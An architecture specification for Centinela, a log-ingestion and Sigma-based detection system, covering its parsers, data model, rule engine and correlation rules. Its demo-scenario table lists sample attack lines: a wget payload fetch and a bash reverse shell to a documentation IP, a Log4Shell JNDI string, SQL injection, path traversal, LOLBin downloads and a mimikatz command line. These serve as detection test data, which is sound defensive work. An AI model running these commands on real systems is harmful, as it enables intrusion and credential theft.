# Centinela — architecture

This document is the contract the build sessions share. If you change a contract (a type, an endpoint, a table), update this file in the same pull request and mention it in your summary.

## 1. Overview

Centinela ingests log lines, turns each line into a `NormalizedEvent`, stores events in PostgreSQL, evaluates every event against compiled Sigma rules, feeds rule matches into a correlation engine, and turns matches into deduplicated alerts. A React dashboard reads events, alerts, rules and statistics through a REST API and receives new alerts over Server-Sent Events.

Design goals, in order: correct detection semantics, safety with hostile input, explainable code, reasonable speed on a laptop (thousands of events per second), and a pleasant analyst experience in English and Spanish.

## 2. Components and data flow

### 2.1 Diagram

```mermaid
flowchart LR
  subgraph Sources
    A[Linux auth.log]
    B[nginx / Apache access logs]
    C[Windows Sysmon JSON]
  end
  A --> I
  B --> I
  C --> I
  I[Ingest: POST /api/ingest or CLI] --> P[Parsers to NormalizedEvent]
  P --> S[(events)]
  P --> D[Sigma matchers]
  R[rules/*.yml] --> D
  R --> K
  D --> K[Correlation engine]
  D --> AS[Alert sink: dedup and suppression]
  K --> AS
  AS --> AL[(alerts)]
  AS --> RT[SSE /api/stream]
  S --> API[REST API]
  AL --> API
  API --> W[React dashboard]
  RT --> W
```

### 2.2 Repository layout

```text
centinela/
  CLAUDE.md                    instructions for Claude sessions
  docs/                        PLAN, ARCHITECTURE, DECISIONS, later THREAT_MODEL, DETECTION, DEPLOY
  data/mitre-attack/           compact ATT&CK tactics and techniques (from mitre/cti)
  rules/
    sigma/                     vendored SigmaHQ subset (DRL 1.1) + regression samples
    centinela/                 Centinela's own Sigma rules (base rules, building blocks)
    correlation/               Centinela's correlation rules (Sigma correlation format)
  content/sigma/               AI-generated playbooks and fixtures per rule (tools/content-pack)
  packages/
    shared/                    zod schemas + types shared by server, web and loggen
    server/
      migrations/              SQL migrations (node-pg-migrate), applied by `npm run db:migrate`
      src/
        config.ts  logger.ts  app.ts  index.ts
        pipeline/              interfaces and orchestrator (S0, finalized in S4)
        parsers/               linux_auth, nginx/apache access, sysmon (S1, S5)
        ingest/                HTTP router and CLI (S1)
        detection/             loader, compiler, matcher, correlation, alerts (S2)
        db/                    migration runner, events-write (S1), queries and alert sink (S4)
        routes/                REST handlers (S0 stubs, S4 real)
        realtime/              SSE hub (S4)
        auth/  security/       (S6)
        content/               playbook loader (S7)
    web/
      src/
        app/  pages/  features/<area>/  components/ui/  api/  i18n/  mocks/
    loggen/                    seeded demo data generator with ground truth (S1, S5)
  scripts/                     cloud-session-start.sh, demo helpers
  tools/content-pack/          Python tool using the Claude Message Batches API
```

### 2.3 Pipeline interfaces

Defined in `packages/server/src/pipeline/types.ts` (S0). Implementations live in their owners' folders.

```ts
import type { NormalizedEvent, Alert, SourceType } from '@centinela/shared';

export interface IngestContext {
  source: SourceType;
  host: string;            // default host when the line does not carry one
  receivedAt: Date;
  timezone: string;        // IANA zone for timestamps without offset; default 'UTC'
  defaultYear?: number;    // for RFC 3164 timestamps; default receivedAt's year
}

export type ParseResult =
  | { ok: true; event: Omit<NormalizedEvent, 'id' | 'ingestedAt'> }
  | { ok: false; reason: string };

export interface Parser {
  readonly source: SourceType;
  parse(line: string, ctx: IngestContext): ParseResult;
}

export interface EventStore {
  insertMany(events: NormalizedEvent[]): Promise<void>;
}

/** Snapshot of the rule, so the sink can build a full Alert without a rule lookup. */
export interface AlertRuleInfo {
  id: string;
  title: string;
  type: 'sigma' | 'correlation';
  level: Level;
  techniques: string[];
  tactics: string[];
  author: string | null;
  url: string | null;
  license: 'DRL-1.1' | 'MIT';
}

export interface AlertCandidate {
  rule: AlertRuleInfo;
  dedupKey: string;
  groupKey: string | null;
  eventIds: string[];        // contributing events, oldest first, at most 100
  firstSeen: string;         // ISO 8601
  lastSeen: string;
  host: string | null;
  entities: { ips: string[]; users: string[]; hosts: string[] };
}

export interface Detector {
  /** Evaluate one event (events arrive in event-time order per batch). */
  process(event: NormalizedEvent): AlertCandidate[];
  /** Advance event time without new events (end of a replay); returns pending matches. */
  flush(watermark: Date): AlertCandidate[];
}

export interface AlertSink {
  upsert(candidates: AlertCandidate[]): Promise<{ created: Alert[]; updated: Alert[] }>;
}

export interface AlertPublisher {
  publish(change: { type: 'alert.created' | 'alert.updated'; alert: Alert }): void;
}

export interface IngestSummary {
  accepted: number;
  rejected: number;
  rejections: Array<{ line: number; reason: string }>;  // first 20
  alertsCreated: number;
  alertsUpdated: number;
  durationMs: number;
}
```

Orchestrator order per batch (up to 1,000 lines): parse each line → assign UUIDv7 ids and `ingestedAt` → sort by `ts` (stable) → `EventStore.insertMany` → `Detector.process` for each event → `AlertSink.upsert` → `AlertPublisher.publish`. At the end of a file or HTTP request: `Detector.flush(maxEventTime)`.

Wiring: `packages/server/src/pipeline/index.ts` (S0) exports `createPipeline(overrides?)`, which assembles the default implementation of each interface from its owner's module:

| Interface | Module (owner) | Until the owner implements it |
| --- | --- | --- |
| `Parser` registry | `src/parsers/index.ts` (S1) | empty registry: every line rejected with `unknown source` |
| `EventStore` | `src/db/events-write.ts` (S1) | stub that throws `not implemented (S1)` |
| `Detector` | `src/detection/index.ts` (S2) | no-op returning no candidates |
| `AlertSink` | in-memory sink in `src/pipeline/` (S0), PostgreSQL sink in `src/db/` (S4) | in-memory |
| `AlertPublisher` | `src/realtime/` (S4) | no-op |

The ingest router and CLI (S1) and every test call `createPipeline()`, so S1 and S2 only change the files they own; S4 changes the defaults in `pipeline/index.ts`. A session that needs a contract change (a field, a method) makes the smallest change in `pipeline/types.ts` or `packages/shared` and lists it in its summary.

## 3. Data model (`packages/shared`)

All types are inferred from zod schemas so the server validates and the web client parses with the same definitions.

### 3.1 NormalizedEvent

```ts
export type SourceType = 'linux_auth' | 'nginx_access' | 'apache_access' | 'sysmon';
export type EventCategory = 'authentication' | 'iam' | 'session' | 'process' | 'web' | 'network' | 'file' | 'other';
export type Outcome = 'success' | 'failure' | 'unknown';
export interface LogSource { product?: string; service?: string; category?: string }
export type FieldValue = string | number | boolean | null;

export interface NormalizedEvent {
  id: string;                 // UUIDv7 assigned by the pipeline
  ts: string;                 // event time, ISO 8601 in UTC
  ingestedAt: string;         // ISO 8601 in UTC
  source: SourceType;
  host: string;
  logsources: LogSource[];    // Sigma logsources this event belongs to; primary first (§5.2)
  category: EventCategory;
  action: string;             // see §4 tables, e.g. 'ssh_login', 'http_request', 'process_start'
  outcome: Outcome;
  user?: string;
  srcIp?: string;             // IPv4 or IPv6, normalized (no brackets, no zone)
  srcPort?: number;
  message: string;            // raw line as received, truncated to 8,192 characters
  fields: Record<string, FieldValue>;
}
```

`fields` is the view that rules match against. It always contains ECS-style keys and, per source, the Sigma field names that SigmaHQ rules use:

| Key family | Examples | Present for |
| --- | --- | --- |
| ECS-style (always) | `event.action`, `event.outcome`, `event.category`, `host.name`, `process.name`, `process.pid`, `user.name`, `source.ip`, `source.port` | every source (when known) |
| Linux specifics | `ssh.method`, `ssh.invalid_user`, `sudo.command`, `sudo.target_user`, `sudo.tty`, `sudo.pwd`, `group.name`, `user.target.name`, `session.service` | `linux_auth` |
| Sigma webserver | `c-ip`, `cs-username`, `cs-method`, `cs-uri-stem`, `cs-uri-query`, `cs-version`, `sc-status`, `sc-bytes`, `cs-referer`, `cs-user-agent` | `nginx_access`, `apache_access` |
| ECS web | `http.request.method`, `url.path`, `url.query`, `url.original`, `http.response.status_code`, `http.response.body.bytes`, `http.request.referrer`, `user_agent.original`, `http.version` | web sources |
| Sigma Windows | `Image`, `CommandLine`, `OriginalFileName`, `ParentImage`, `ParentCommandLine`, `User`, `IntegrityLevel`, `Hashes`, `CurrentDirectory`, `Description`, `Product`, `Company`, ... | `sysmon` |

SigmaHQ rules use Sigma field names or keyword lists (matched against `message`). Centinela's own rules use the ECS-style keys.

### 3.2 Alert

```ts
export type Level = 'informational' | 'low' | 'medium' | 'high' | 'critical';
export type AlertStatus = 'new' | 'acknowledged' | 'closed';
export type Resolution = 'true_positive' | 'false_positive' | 'benign';

export interface Alert {
  id: string;                     // UUIDv7
  ruleId: string;
  ruleTitle: string;
  ruleType: 'sigma' | 'correlation';
  level: Level;
  status: AlertStatus;
  resolution: Resolution | null;
  note: string | null;
  dedupKey: string;
  groupKey: string | null;        // e.g. 'source.ip=203.0.113.45'
  host: string | null;
  techniques: string[];           // e.g. ['T1110.001']
  tactics: string[];              // ATT&CK shortnames derived from techniques, e.g. ['credential-access']
  entities: { ips: string[]; users: string[]; hosts: string[] };
  firstSeen: string;
  lastSeen: string;
  count: number;                  // matches folded into this alert
  author: string | null;          // DRL 1.1 attribution for SigmaHQ rules
  ruleUrl: string | null;
  license: 'DRL-1.1' | 'MIT' | null;
  createdAt: string;
  updatedAt: string;
}
```

### 3.3 RuleMeta

```ts
export interface RuleMeta {
  id: string;                     // Sigma id (UUID)
  name: string | null;            // Sigma `name`, used by correlation references
  title: string;
  description: string | null;
  type: 'sigma' | 'correlation';
  level: Level;
  status: string | null;          // stable | test | experimental
  author: string | null;
  references: string[];
  date: string | null;
  modified: string | null;
  tags: string[];
  techniques: string[];           // from tags 'attack.tNNNN[.NNN]', upper-cased
  tactics: string[];              // derived from techniques via data/mitre-attack
  logsource: LogSource | null;
  falsepositives: string[];
  origin: 'sigmahq' | 'centinela';
  path: string;                   // repo-relative
  url: string | null;             // https://github.com/SigmaHQ/sigma/blob/<commit>/rules/<path below rules/sigma>
  license: 'DRL-1.1' | 'MIT';
  supported: boolean;
  unsupportedReason: string | null;
  buildingBlock: boolean;         // referenced by a correlation with generate: false
  enabled: boolean;
}
```

The SigmaHQ commit is the one recorded in `rules/sigma/README.md`.

## 4. Log sources and parsers

Rule routing uses `logsources` (§5.2). Each parser sets them as follows:

| Source | `logsources` (primary first) |
| --- | --- |
| `linux_auth`, program `sshd` | `{product: linux, service: sshd}`, `{product: linux, service: auth}` |
| `linux_auth`, program `sudo` | `{product: linux, service: sudo}`, `{product: linux, service: auth}` |
| `linux_auth`, any other program | `{product: linux, service: auth}` |
| `nginx_access` | `{category: webserver}`, `{service: nginx}` |
| `apache_access` | `{category: webserver}`, `{service: apache}` |
| `sysmon` EID 1 / 3 / 11 | `{product: windows, category: process_creation}` / `network_connection` / `file_event` |

### 4.1 Linux auth.log

Line formats: RFC 3164 `Oct 25 14:03:12 bastion-01 sshd[1234]: <message>` (no year, no zone: use `IngestContext.defaultYear` and `timezone`; if the result is more than 24 h after `receivedAt`, subtract one year) and RFC 3339 `2026-10-25T14:03:12.123456-05:00 bastion-01 sshd[1234]: <message>` (Ubuntu 23.10+ default). The `[pid]` part is optional. `host.name` comes from the line.

| Program | Message pattern (regex-like) | action | outcome | category | Extra fields |
| --- | --- | --- | --- | --- | --- |
| sshd | `Accepted (password\|publickey\|keyboard-interactive/pam\|gssapi-with-mic) for U from IP port P` | `ssh_login` | success | authentication | `ssh.method` |
| sshd | `Failed (password\|publickey\|none\|keyboard-interactive/pam) for (invalid user )?U from IP port P` | `ssh_login` | failure | authentication | `ssh.method`, `ssh.invalid_user` |
| sshd | `Invalid user U from IP( port P)?` | `ssh_invalid_user` | failure | authentication | `ssh.invalid_user=true` |
| sshd | `error: maximum authentication attempts exceeded for (invalid user )?U from IP port P ssh2 \[preauth\]` | `ssh_max_auth_exceeded` | failure | authentication | |
| sshd | `Connection closed by (authenticating\|invalid) user U IP port P \[preauth\]`, `Connection (closed\|reset) by IP port P( \[preauth\])?` | `ssh_preauth_close` | unknown | session | |
| sshd | `Received disconnect from IP port P:.*`, `Disconnected from (user U )?IP port P` | `ssh_disconnect` | unknown | session | |
| sshd | `pam_unix\(sshd:auth\): authentication failure; .* rhost=IP( +user=U)?` | `ssh_pam_auth_failure` | failure | authentication | |
| any | `pam_unix\((S):session\): session opened for user U(\(uid=N\))? by .*` | `session_opened` | success | session | `session.service=S` |
| any | `pam_unix\((S):session\): session closed for user U` | `session_closed` | success | session | `session.service=S` |
| sudo | `U : TTY=T ; PWD=D ; USER=R ; COMMAND=C` | `sudo_command` | success | process | `sudo.*` |
| sudo | `U : N incorrect password attempts? ; TTY=T ; PWD=D ; USER=R ; COMMAND=C` | `sudo_auth_failure` | failure | authentication | `sudo.*` |
| sudo | `pam_unix\(sudo:auth\): authentication failure; .* user=U` | `sudo_auth_failure` | failure | authentication | |
| sudo | `U : user NOT in sudoers ; TTY=T ; PWD=D ; USER=R ; COMMAND=C` | `sudo_not_in_sudoers` | failure | iam | `sudo.*` |
| useradd | `new user: name=U, UID=N, GID=N, home=H, shell=S(, from=.*)?` | `user_created` | success | iam | `user.id`, `group.id` |
| useradd, groupadd | `new group: name=G, GID=N` | `group_created` | success | iam | `group.name` |
| usermod, gpasswd | `add 'U' to (shadow )?group 'G'`, `user U added by \S+ to group G` | `user_added_to_group` | success | iam | `group.name` |
| passwd | `pam_unix\(passwd:chauthtok\): password changed for U` | `password_changed` | success | iam | |
| su | `\(to R\) U on \S+`, `Successful su for R by U` | `su_session` | success | authentication | `user.target.name=R` |
| su | `FAILED SU \(to R\) U on \S+`, `pam_authenticate: Authentication failure` | `su_failure` | failure | authentication | `user.target.name=R` |
| systemd-logind | `New session \S+ of user U\.` / `Removed session \S+\.` | `logind_session_new` / `logind_session_removed` | success | session | |
| any | anything else | `other` | unknown | other | |

`user` is the account the event is about (for sudo, the invoking user; the target goes to `sudo.target_user`).

### 4.2 Web access logs (nginx and Apache)

Combined format: `$remote_addr - $remote_user [$time_local] "$request" $status $body_bytes_sent "$http_referer" "$http_user_agent"`, optionally followed by a request time. Time format `25/Oct/2026:14:03:12 -0500`.

- `action`: `http_request`, or `http_malformed` when the request line is not `METHOD SP target SP HTTP/x` (scanners send TLS handshakes and garbage to HTTP ports; keep them).
- `outcome`: `success` for status < 400, `failure` for ≥ 400.
- Sigma fields keep the raw, URL-encoded text (SigmaHQ rules list encoded variants themselves). `cs-uri-query` excludes the leading `?`. `-` means absent (omit the field).
- `url.query_decoded` holds a best-effort decoded copy for display only; rules do not use it.

### 4.3 Demo data scenarios (`packages/loggen`)

Company: "Andes Retail". Hosts: `bastion-01` (SSH jump host), `web-01`, `web-02` (nginx), `db-01`, and the Windows workstations `ws-0142` and `ws-0187` with Sysmon (S5, `samples/<host>/sysmon.jsonl`). IP plan: attackers from documentation ranges `192.0.2.0/24`, `198.51.100.0/24`, `203.0.113.0/24`; customers from the benchmarking range `198.18.0.0/15`; office and servers in `10.20.0.0/16`. No real people, domains or public addresses.

| Id | Host | What happens | ATT&CK | Expected detections |
| --- | --- | --- | --- | --- |
| `ssh-bruteforce` | bastion-01 | 300 failed passwords for `root`/`admin` from 203.0.113.45 within 4 minutes | T1110.001 | correlation `centinela-ssh-bruteforce` |
| `password-spray` | bastion-01 | one failed attempt for each of 25 usernames from 198.51.100.23, one every ~48 seconds (20 minutes), so the brute-force threshold is never reached | T1110.003 | correlation `centinela-ssh-password-spraying` |
| `bruteforce-success` | bastion-01 | 40 failures within 3 minutes, then `Accepted password for deploy` from 203.0.113.77 | T1110.001, T1078 | correlations `centinela-ssh-bruteforce` and `centinela-ssh-bruteforce-success` |
| `post-compromise` | bastion-01 | `deploy` runs two commands through sudo, so auth.log records them as `COMMAND=` lines: `/usr/bin/sh -c cd /tmp; wget http://203.0.113.77/x; chmod +x x` and `/usr/bin/bash -c bash -i >& /dev/tcp/203.0.113.77/4444 0>&1` | T1105, T1059.004 | SigmaHQ `lnx_shell_susp_commands.yml`, `lnx_shell_susp_rev_shells.yml` |
| `privileged-user` | bastion-01 | `useradd` creates `backup2` with `GID=27` (the line must contain `GID=27,`), then `usermod -aG sudo backup2` | T1136.001, T1098 | SigmaHQ `lnx_privileged_user_creation.yml`; correlation `centinela-privileged-account-created` |
| `sudo-not-allowed` | db-01 | `intern` (not in sudoers) tries sudo three times | T1548.003 | base rule `centinela-sudo-user-not-in-sudoers` |
| `web-recon` | web-01 | about 600 requests in 3 minutes from 192.0.2.10 with Nikto (`Nikto/2.5.0`) and gobuster (`gobuster/3.6`) user agents, mostly 404 | T1595.002 | SigmaHQ `web_susp_useragents.yml`; correlation `centinela-web-scanning-burst` |
| `sqli` | web-01 | GET requests from 192.0.2.10 with user agent `sqlmap/1.8` whose query strings contain `UNION%20ALL%20SELECT` and `%271%27%3D%271`, answered 200 or 500 (the rule ignores 404) | T1190 | SigmaHQ `web_sql_injection_in_access_logs.yml` and `web_susp_useragents.yml` |
| `path-traversal` | web-02 | `GET /download?file=../../../../etc/passwd` and `GET /download?file=..%252f..%252f..%252fetc%252fpasswd`; the rule reads only `cs-uri-query`, so the traversal must be in the query string | T1190 | SigmaHQ `web_path_traversal_exploitation_attempt.yml` |
| `log4shell-probe` | web-02 | user agent `${jndi:ldap://203.0.113.99:1389/Basic/Command/Base64/aWQ=}`; the rule matches JNDI-Exploit-Kit paths such as `/Basic/Command/Base64/`. Keep it out of the query string, where `=${` would also fire `web_ssti_in_access_logs.yml` | T1190 | SigmaHQ `web_jndi_exploit.yml` |
| `webshell` | web-01 | `GET /uploads/img.php?cmd=whoami`, then `GET /uploads/img.php?cmd=net+user` | T1505.003 | SigmaHQ `web_win_webshells_in_access_logs.yml` |
| `office-macro-powershell` | ws-0142 | Word opens a macro document from Downloads and starts `powershell.exe` | T1566.001, T1204.002, T1059.001 | SigmaHQ `proc_creation_win_office_susp_child_processes.yml` |
| `encoded-powershell` | ws-0142 | that PowerShell starts `powershell.exe -EncodedCommand <base64 of a Write-Output line>` | T1059.001, T1027 | SigmaHQ `proc_creation_win_powershell_encode.yml` |
| `certutil-download` | ws-0142 | `certutil.exe -urlcache -split -f http://203.0.113.50/inventario.txt ...`, its connection (event 3) and the file it writes (event 11) | T1105 | SigmaHQ `proc_creation_win_certutil_download.yml`, `proc_creation_win_certutil_download_direct_ip.yml`; `centinela-win-lolbin-network-connection`, `centinela-win-lolbin-file-drop` |
| `scheduled-task` | ws-0142 | `schtasks.exe /Create ... /TR "notepad.exe C:\Users\Public\Downloads\inventario.txt"` | T1053.005 | SigmaHQ `proc_creation_win_schtasks_creation.yml`, `proc_creation_win_schtasks_env_folder.yml` |
| `mshta-remote-hta` | ws-0187 | `mshta.exe http://203.0.113.60/aviso-pago.hta` and its connection | T1218.005 | SigmaHQ `proc_creation_win_mshta_http.yml`; `centinela-win-lolbin-network-connection` |
| `regsvr32-scriptlet` | ws-0187 | `regsvr32.exe /s /n /u /i:http://203.0.113.60/demo.sct scrobj.dll` | T1218.010 | SigmaHQ `proc_creation_win_regsvr32_network_pattern.yml` |
| `rundll32-proxy` | ws-0187 | `rundll32.exe C:\Users\Public\Downloads\aviso.dat,DllRegisterServer` | T1218.011 | SigmaHQ `proc_creation_win_rundll32_uncommon_dll_extension.yml` |
| `credential-dumping` | ws-0187 | an elevated `cmd.exe` runs `mk.exe "privilege::debug" "sekurlsa::logonpasswords" exit` | T1003.001 | SigmaHQ `proc_creation_win_hktl_mimikatz_command_line.yml` |

Windows command lines only need to satisfy their rules and are inert (documentation addresses, a harmless encoded command, no real tool). Windows background traffic (service-host housekeeping all day; Outlook, Chrome, documents, proxy and mail connections and downloads on working days) must not trigger any rule at any level.

Background traffic must not trigger `high`/`critical` alerts: admins logging in with public keys from the office range, at most two consecutive password typos by staff, cron sessions every 5 minutes, routine sudo (`apt`, `systemctl`, `journalctl`), logind sessions, customer browsing (`/`, `/products/*`, `/cart`, static assets), search engine bots, a few 404s (`/favicon.ico`, an occasional `/wp-login.php`).

`samples/ground-truth.json`:

```json
{
  "seed": 42,
  "start": "2026-10-20T00:00:00Z",
  "days": 3,
  "scenarios": [
    {
      "id": "ssh-bruteforce",
      "host": "bastion-01",
      "techniques": ["T1110.001"],
      "start": "2026-10-21T03:12:00Z",
      "end": "2026-10-21T03:16:00Z",
      "entities": { "ips": ["203.0.113.45"], "users": ["root", "admin"] },
      "expected": ["centinela-ssh-bruteforce"]
    }
  ]
}
```

`expected` lists rule `name`s for Centinela rules (§6) and rule file names (without `.yml`) for SigmaHQ rules. The end-to-end test requires every expected rule to alert for the scenario's entities within its time range; other alerts for the same scenario are allowed.

### 4.4 Windows Sysmon (S5)

JSON lines in either shape:

- nested, as in `rules/sigma/regression/**/*.json`: `{"Event": {"System": {"EventID": 1, "Computer": "WS-0142", "TimeCreated": {"#attributes": {"SystemTime": "..."}}}, "EventData": {"Image": "...", ...}}}`;
- flat: `{"EventID": 1, "Computer": "WS-0142", "UtcTime": "...", "Image": "...", ...}`.

`EventData` keys become Sigma fields unchanged. Event ID 1 → `process_start` (category `process`), 3 → `network_connection` (`network`), 11 → `file_create` (`file`). Others → `other`.

Parser details (S5, `docs/decisions/S5.md`): `EventID` and `Computer` are added as fields; keys that are not Windows field names (`^[A-Za-z][A-Za-z0-9_]{0,127}$`) are left out of `fields`; time is `UtcTime`, else `SystemTime` / `TimeCreated`, read as UTC; `host` is `Computer`; `User` (`DOMAIN\name`) gives `user` = name and `user.domain`; `srcIp`/`srcPort` come from `SourceIp`/`SourcePort` for event 3 only, the remote end goes to `destination.ip`/`destination.port`; ECS-style `process.*` and `file.*` keys are added; an event from another provider or channel becomes `other`.

The SigmaHQ regression samples are not JSON lines: each file is pretty-printed JSON, and 5 of the 267 files hold several objects back to back, so read them with a streaming JSON decoder. A sample file is named `<rule id>.json` and sits in a folder named after the rule file (without `.yml`); `info.yml` lists the rule under `rule_metadata`.

## 5. Sigma engine (`packages/server/src/detection`)

Reference semantics: the Sigma specification (https://github.com/SigmaHQ/sigma-specification) and pySigma's behavior. When this section and pySigma disagree, follow pySigma and record it in your session's `docs/decisions/S<N>.md` — except where this document states a deliberate deviation (D-010 in §6).

### 5.1 Loading

- One YAML document per file (`yaml` package, `uniqueKeys: true`); multi-document files are unsupported.
- Required: `title`, `id` (UUID), `logsource` (not for correlations), `detection` with `condition` (or `correlation`).
- Skip `status: deprecated` and `status: unsupported`.
- Metadata per §3.3. Rules are compiled once at startup; reloading is out of scope.

### 5.2 Logsource routing

A rule applies to an event when, for at least one entry of `event.logsources`, every key the rule's `logsource` sets (`product`, `service`, `category`) equals that entry's value (case-insensitive). Keys the rule does not set are ignored, so `{product: linux}` applies to every Linux event. `definition` is documentation only. Build an index from logsource to compiled rules at load time.

### 5.3 Value matching and modifiers

Selections:

- A map: every field must match (AND). A list of values for a field: any value matches (OR), unless `|all`.
- A list of maps: any map matches (OR).
- A plain list of values (keywords): any value appears in `message` (OR, or AND with `|all`). Keyword values are implicitly wrapped in `*…*` (substring search).

Strings:

- Case-insensitive by default. `*` matches any sequence (including empty), `?` exactly one character.
- Escaping (pySigma `SigmaString`): `\*`, `\?` and `\\` produce a literal `*`, `?` and `\`. A backslash followed by any other character is a literal backslash (so Windows paths need no escaping).
- Numbers in rules are compared as their decimal string form against the field's string form.
- `null`: matches when the field is absent, null or the empty string. `''` matches only the empty string.
- A field missing from the event never matches a non-null value.

| Modifier | Meaning |
| --- | --- |
| `contains` / `startswith` / `endswith` | wrap the value as `*v*` / `v*` / `*v` |
| `all` | every value in the list must match |
| `windash` | every `-` or `/` that starts an option — preceded by the start of the value or a non-word character and followed by a word character (pySigma's `\B[-/]\b`) — may be any of `-`, `/`, `–` (U+2013), `—` (U+2014), `―` (U+2015); positions vary independently (all combinations), so `' -s -i cmd'` also matches `' /s -i cmd'` |
| `re` | regular expression, unanchored, case-sensitive; sub-modifiers `i` (ignore case), `m` (multiline), `s` (dot matches newline). See §5.6 |
| `cased` | case-sensitive comparison |
| `base64` | match the standard base64 encoding of the value |
| `base64offset` | match any of the three offset encodings (pySigma algorithm below); used with `contains` |
| `utf16le` / `wide`, `utf16be`, `utf16` | encode the value in that encoding before `base64`/`base64offset` (`utf16` adds a BOM) |
| `cidr` | the field is an IP address inside the given IPv4/IPv6 network |
| `exists` | `true`: field present and not null; `false`: absent or null |
| `lt` / `lte` / `gt` / `gte` | numeric comparison; non-numeric field values never match |
| `fieldref` | the field equals the value of the field named by the value (case-insensitive) |
| `expand` | unsupported (placeholders) |

`base64offset` (pySigma):

```text
for i in 0, 1, 2:
  encoded = base64(i spaces + value)
  start   = [0, 2, 3][i]
  end     = [none, -3, -2][(len(value) + i) % 3]
  variant = encoded[start:end]
```

### 5.4 Condition grammar

```text
condition  := or_expr
or_expr    := and_expr ( "or" and_expr )*
and_expr   := not_expr ( "and" not_expr )*
not_expr   := "not" not_expr | primary
primary    := "(" or_expr ")" | quantifier | identifier
quantifier := ( "1" | "any" | "all" ) "of" ( pattern | "them" )
identifier := [A-Za-z0-9_]+
pattern    := identifier characters plus "*" wildcards
```

Keywords are case-insensitive. `them` means every search identifier except those starting with `_`. A pattern that matches no identifier makes the rule unsupported. A `condition` given as a list means the OR of its items.

### 5.5 Unsupported features

Skip the rule and record `unsupportedReason` (a short code plus detail, e.g. `modifier:expand`, `condition:aggregation`, `regex:not-re2`): aggregation syntax in conditions (`| count() by …`), `near`, `timeframe` outside correlation rules, `expand`, unknown modifiers, multi-document YAML, regexes the linear-time engine cannot compile.

### 5.6 Regex safety and limits

- Compile `|re` patterns with a linear-time engine (`re2-wasm`). Patterns RE2 cannot express (backreferences, lookaround) make the rule unsupported. If `re2-wasm` proves unusable, fall back to native `RegExp` with a 4,096-character input cap per field plus a static ReDoS check, and record the decision.
- Truncate every field value to 8,192 characters before matching (`message` is already truncated at ingest).
- Precompute lower-cased patterns at compile time; lower-case event values once per event (cache per field).
- Translate simple wildcard patterns to `startsWith`/`endsWith`/`includes`/equality instead of regexes.

## 6. Correlation engine

Format: the Sigma correlation rules specification (subset). Example:

```yaml
title: SSH brute force from a single source
id: 6c1f0b6e-5f5a-4e61-9a0e-1f2b3c4d5e6f
name: centinela-ssh-bruteforce
status: experimental
description: Ten or more failed SSH logins from one source IP within five minutes.
author: DavidRamPari
correlation:
  type: event_count
  rules:
    - centinela-ssh-auth-failure
  group-by:
    - source.ip
    - host.name
  timespan: 5m
  condition:
    gte: 10
  generate: false
level: high
tags:
  - attack.credential-access
  - attack.t1110.001
falsepositives:
  - Automation retrying with an expired password
```

Semantics:

- `rules` reference other rules by `name` (preferred) or `id`. A reference can point to a Sigma rule or to another correlation rule (chaining). Unknown references and cycles make the correlation unsupported.
- Chaining: when a referenced correlation fires, that firing counts as one match for the outer correlation, at the time of its last contributing event and with the group-by values of its group. The inner rule's `group-by` must contain every field of the outer `group-by`. Evaluate correlations in dependency order.
- `group-by` values come from `fields`; an event missing a group-by field does not take part in that correlation. Group key format: `field=value` pairs joined by `,` in the declared order.
- `timespan`: integer plus `s`, `m`, `h` or `d`.
- `event_count`: number of matches for the group within `[t − timespan, t]`.
- `value_count`: number of distinct values of `condition.field` within the window.
- `temporal`: every referenced rule matched at least once for the group within the window, in any order. `temporal_ordered`: in the listed order.
- `condition` operators: `gt` and `gte` only (several combine with AND), evaluated after each new match. `lt`, `lte` and `eq` (absence-style rules) are unsupported in this version.
- When a correlation fires, emit one candidate linking the contributing events (at most 100), then clear that group's window so the next alert needs a fresh window.
- `generate` (default `false`): when false, the Sigma rules it references are building blocks and do not create alerts of their own. A Sigma rule is a building block only if every correlation that references it has `generate: false`. Referenced correlation rules keep alerting either way (Centinela's choice, D-010; pySigma silences them too).
- Event time only. Batches are sorted by `ts`; events up to 60 s older than the group's newest event are accepted, older ones are stored but ignored by correlation. State for a group is evicted when the watermark (newest event time seen) passes its newest entry plus `timespan`.

### 6.1 Centinela's rules

S2 writes these rules exactly as specified; S1 uses the same names in `samples/ground-truth.json`. Thresholds are set so the scenarios in §4.3 fire and the background traffic does not.

Base rules (`rules/centinela/`, Sigma format, ECS-style fields from §3.1):

| Name | Logsource | Detection | Level | Used by |
| --- | --- | --- | --- | --- |
| `centinela-ssh-auth-failure` | `product: linux`, `service: sshd` | `event.action: ssh_login` and `event.outcome: failure` | low | ssh-bruteforce, ssh-password-spraying (building block) |
| `centinela-ssh-auth-success` | `product: linux`, `service: sshd` | `event.action: ssh_login` and `event.outcome: success` | informational | ssh-bruteforce-success (building block) |
| `centinela-sudo-auth-failure` | `product: linux`, `service: sudo` | `event.action: sudo_auth_failure` | low | alerts on its own |
| `centinela-sudo-user-not-in-sudoers` | `product: linux`, `service: sudo` | `event.action: sudo_not_in_sudoers` | medium | alerts on its own |
| `centinela-user-created` | `product: linux`, `service: auth` | `event.action: user_created` | low | privileged-account-created (also alerts) |
| `centinela-user-added-to-privileged-group` | `product: linux`, `service: auth` | `event.action: user_added_to_group` and `group.name` in `sudo`, `wheel`, `adm`, `root` | medium | privileged-account-created (also alerts) |
| `centinela-web-not-found` | `category: webserver` | `http.response.status_code: 404` | informational | web-scanning-burst (building block) |
| `centinela-win-lolbin-network-connection` | `product: windows`, `category: network_connection` | `Image` ends with `\certutil.exe`, `\bitsadmin.exe`, `\mshta.exe` or `\regsvr32.exe`, `Initiated: 'true'`, `DestinationIp` outside private, loopback, link-local and unique-local ranges (S5) | medium | alerts on its own |
| `centinela-win-lolbin-file-drop` | `product: windows`, `category: file_event` | the same `Image` list, `TargetFilename` not in `\CryptnetUrlCache\` or `\INetCache\` (S5) | medium | alerts on its own |

Correlation rules (`rules/correlation/`):

| Name | Type | Rules | Group-by | Timespan | Condition | `generate` | Level | ATT&CK |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `centinela-ssh-bruteforce` | `event_count` | `centinela-ssh-auth-failure` | `source.ip`, `host.name` | 5m | `gte: 10` | false | high | T1110.001 |
| `centinela-ssh-password-spraying` | `value_count` (`field: user.name`) | `centinela-ssh-auth-failure` | `source.ip` | 10m | `gte: 10` | false | high | T1110.003 |
| `centinela-ssh-bruteforce-success` | `temporal_ordered` | `centinela-ssh-bruteforce`, `centinela-ssh-auth-success` | `source.ip` | 30m | — | false | critical | T1110.001, T1078 |
| `centinela-privileged-account-created` | `temporal_ordered` | `centinela-user-created`, `centinela-user-added-to-privileged-group` | `user.name`, `host.name` | 10m | — | true | high | T1136.001, T1098 |
